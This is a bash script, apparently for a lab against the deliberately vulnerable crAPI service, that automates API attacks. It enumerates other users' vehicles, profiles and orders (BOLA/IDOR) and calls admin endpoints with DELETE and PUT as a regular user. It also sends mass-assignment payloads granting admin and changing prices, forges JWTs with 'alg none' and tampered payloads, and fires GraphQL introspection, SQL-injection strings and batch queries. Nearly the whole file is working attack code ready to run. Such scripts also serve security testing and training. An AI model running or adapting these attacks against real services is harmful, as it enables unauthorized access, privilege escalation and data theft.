#!/bin/bash
###############################################################################
# API Attack Script (crAPI / REST API targets)
# BOLA, BFLA, mass assignment, JWT manipulation, GraphQL introspection
###############################################################################

SUBTYPE="${1:-full}"
TARGET_IP="${2:-10.10.40.31}"
TARGET_PORT="${3:-80}"
RESULTS_DIR="${4:-.}"
BASE_URL="http://${TARGET_IP}:${TARGET_PORT}"

mkdir -p "$RESULTS_DIR"

echo "[*] API attacks: $SUBTYPE against ${BASE_URL}"

# Helper: get auth token from crAPI
get_auth_token() {
    local token
    token=$(curl -sk -X POST "${BASE_URL}/identity/api/auth/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"victim@example.com","password":"Victim1!"}' 2>/dev/null | \
        python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null)
    echo "$token"
}

run_bola() {
    echo "[*] BOLA (Broken Object Level Authorization)"

    # Register a user first
    curl -sk -X POST "${BASE_URL}/identity/api/auth/signup" \
        -H "Content-Type: application/json" \
        -d '{"name":"attacker","email":"attacker@evil.com","number":"1234567890","password":"Attack3r!"}' \
        -o /dev/null 2>&1 || true

    local token
    token=$(get_auth_token)

    # Enumerate other users' vehicles
    echo "[*] Enumerating vehicle IDs..."
    for i in $(seq 1 30); do
        curl -sk "${BASE_URL}/identity/api/v2/vehicle/${i}/location" \
            -H "Authorization: Bearer ${token}" \
            -o /dev/null 2>&1 || true
        sleep 0.3
    done

    # Try accessing other users' data
    echo "[*] IDOR on user profiles..."
    for i in $(seq 1 20); do
        curl -sk "${BASE_URL}/identity/api/v2/user/${i}" \
            -H "Authorization: Bearer ${token}" \
            -o /dev/null 2>&1 || true
        sleep 0.3
    done

    # Enumerate orders
    echo "[*] IDOR on orders..."
    for i in $(seq 1 20); do
        curl -sk "${BASE_URL}/workshop/api/shop/orders/${i}" \
            -H "Authorization: Bearer ${token}" \
            -o /dev/null 2>&1 || true
        sleep 0.3
    done

    echo "[+] BOLA attacks complete"
}

run_bfla() {
    echo "[*] BFLA (Broken Function Level Authorization)"

    local token
    token=$(get_auth_token)

    # Try admin-only endpoints as regular user
    echo "[*] Accessing admin endpoints as regular user..."
    local admin_endpoints=(
        "/identity/api/v2/admin/users"
        "/identity/api/v2/admin/videos"
        "/workshop/api/admin/orders"
        "/workshop/api/admin/shop/products"
        "/identity/api/v2/admin/settings"
    )

    for endpoint in "${admin_endpoints[@]}"; do
        curl -sk "${BASE_URL}${endpoint}" \
            -H "Authorization: Bearer ${token}" \
            -o /dev/null -w "  GET ${endpoint}: %{http_code}\n" \
            >> "${RESULTS_DIR}/bfla_results.txt" 2>&1 || true
        sleep 0.5
    done

    # Try modifying resources via PUT/DELETE
    echo "[*] Testing method-level auth..."
    for endpoint in "${admin_endpoints[@]}"; do
        curl -sk -X DELETE "${BASE_URL}${endpoint}/1" \
            -H "Authorization: Bearer ${token}" \
            -o /dev/null -w "  DELETE ${endpoint}/1: %{http_code}\n" \
            >> "${RESULTS_DIR}/bfla_results.txt" 2>&1 || true
        curl -sk -X PUT "${BASE_URL}${endpoint}/1" \
            -H "Authorization: Bearer ${token}" \
            -H "Content-Type: application/json" \
            -d '{"role":"admin"}' \
            -o /dev/null -w "  PUT ${endpoint}/1: %{http_code}\n" \
            >> "${RESULTS_DIR}/bfla_results.txt" 2>&1 || true
        sleep 0.5
    done

    echo "[+] BFLA attacks complete"
}

run_mass_assign() {
    echo "[*] Mass Assignment attacks"

    local token
    token=$(get_auth_token)

    # Try to set admin role via mass assignment
    echo "[*] Attempting mass assignment on user profile..."
    curl -sk -X PUT "${BASE_URL}/identity/api/v2/user/dashboard" \
        -H "Authorization: Bearer ${token}" \
        -H "Content-Type: application/json" \
        -d '{"name":"attacker","role":"admin","isAdmin":true,"credit":99999}' \
        -o "${RESULTS_DIR}/mass_assign_user.json" 2>&1 || true

    # Try to modify product prices
    curl -sk -X PUT "${BASE_URL}/workshop/api/shop/products/1" \
        -H "Authorization: Bearer ${token}" \
        -H "Content-Type: application/json" \
        -d '{"name":"Product","price":0.01,"status":"active"}' \
        -o "${RESULTS_DIR}/mass_assign_product.json" 2>&1 || true

    # Try to modify order status
    curl -sk -X PUT "${BASE_URL}/workshop/api/shop/orders/1" \
        -H "Authorization: Bearer ${token}" \
        -H "Content-Type: application/json" \
        -d '{"status":"delivered","quantity":100}' \
        -o "${RESULTS_DIR}/mass_assign_order.json" 2>&1 || true

    # Register with extra fields
    curl -sk -X POST "${BASE_URL}/identity/api/auth/signup" \
        -H "Content-Type: application/json" \
        -d '{"name":"hacker","email":"hacker@evil.com","number":"9876543210","password":"Hack3r!","role":"admin","isAdmin":true}' \
        -o "${RESULTS_DIR}/mass_assign_register.json" 2>&1 || true

    echo "[+] Mass assignment attacks complete"
}

run_jwt() {
    echo "[*] JWT manipulation attacks"

    local token
    token=$(get_auth_token)

    if [[ -z "$token" ]]; then
        echo "[!] Could not obtain auth token, using dummy"
        token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIifQ.dummy"
    fi

    # Decode and display JWT
    echo "[*] Original token:"
    echo "$token" | cut -d. -f2 | base64 -d 2>/dev/null || true
    echo ""

    # Try with algorithm none
    echo "[*] Testing JWT algorithm none..."
    local header_none
    header_none=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
    local payload
    payload=$(echo "$token" | cut -d. -f2)
    local forged_token="${header_none}.${payload}."

    curl -sk "${BASE_URL}/identity/api/v2/user/dashboard" \
        -H "Authorization: Bearer ${forged_token}" \
        -o "${RESULTS_DIR}/jwt_none.json" 2>&1 || true

    # Try with modified payload (escalate to admin)
    echo "[*] Testing JWT payload modification..."
    local admin_payload
    admin_payload=$(echo -n '{"sub":"1","role":"admin","isAdmin":true}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
    local header
    header=$(echo "$token" | cut -d. -f1)
    local sig
    sig=$(echo "$token" | cut -d. -f3)
    local modified_token="${header}.${admin_payload}.${sig}"

    curl -sk "${BASE_URL}/identity/api/v2/user/dashboard" \
        -H "Authorization: Bearer ${modified_token}" \
        -o "${RESULTS_DIR}/jwt_modified.json" 2>&1 || true

    # Try expired token reuse
    echo "[*] Testing expired token acceptance..."
    curl -sk "${BASE_URL}/identity/api/v2/user/dashboard" \
        -H "Authorization: Bearer ${token}" \
        -o "${RESULTS_DIR}/jwt_reuse.json" 2>&1 || true

    echo "[+] JWT manipulation attacks complete"
}

run_graphql() {
    echo "[*] GraphQL introspection and injection"

    # Try common GraphQL endpoints
    local endpoints=("/graphql" "/graphiql" "/v1/graphql" "/api/graphql" "/query")

    for endpoint in "${endpoints[@]}"; do
        echo "[*] Probing GraphQL: ${endpoint}"

        # Introspection query
        curl -sk -X POST "${BASE_URL}${endpoint}" \
            -H "Content-Type: application/json" \
            -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}' \
            -o "${RESULTS_DIR}/graphql_introspection_$(echo $endpoint | tr '/' '_').json" 2>&1 || true

        # Query for all types
        curl -sk -X POST "${BASE_URL}${endpoint}" \
            -H "Content-Type: application/json" \
            -d '{"query":"{ __schema { queryType { fields { name description } } } }"}' \
            -o /dev/null 2>&1 || true

        sleep 0.5
    done

    # SQL injection in GraphQL
    echo "[*] GraphQL injection attempts..."
    local injections=(
        '{"query":"{ user(id: \"1 OR 1=1\") { name email } }"}'
        '{"query":"{ users(filter: \"\\\" OR 1=1 --\") { name } }"}'
        '{"query":"mutation { login(email: \"admin\\\" OR 1=1 --\", password: \"x\") { token } }"}'
    )

    for injection in "${injections[@]}"; do
        curl -sk -X POST "${BASE_URL}/graphql" \
            -H "Content-Type: application/json" \
            -d "$injection" \
            -o /dev/null 2>&1 || true
        sleep 0.5
    done

    # Batch query attack (DoS potential)
    echo "[*] Batch query attack..."
    curl -sk -X POST "${BASE_URL}/graphql" \
        -H "Content-Type: application/json" \
        -d '[{"query":"{ user(id:1) { name } }"},{"query":"{ user(id:2) { name } }"},{"query":"{ user(id:3) { name } }"}]' \
        -o /dev/null 2>&1 || true

    echo "[+] GraphQL attacks complete"
}

case "$SUBTYPE" in
    bola)           run_bola ;;
    bfla)           run_bfla ;;
    mass_assign)    run_mass_assign ;;
    jwt)            run_jwt ;;
    graphql)        run_graphql ;;
    full)
        run_bola
        sleep 3
        run_bfla
        sleep 3
        run_mass_assign
        sleep 3
        run_jwt
        sleep 3
        run_graphql
        ;;
    *)
        echo "Unknown subtype: $SUBTYPE"
        echo "Available: bola, bfla, mass_assign, jwt, graphql, full"
        exit 1
        ;;
esac

echo "[*] API attack script complete"
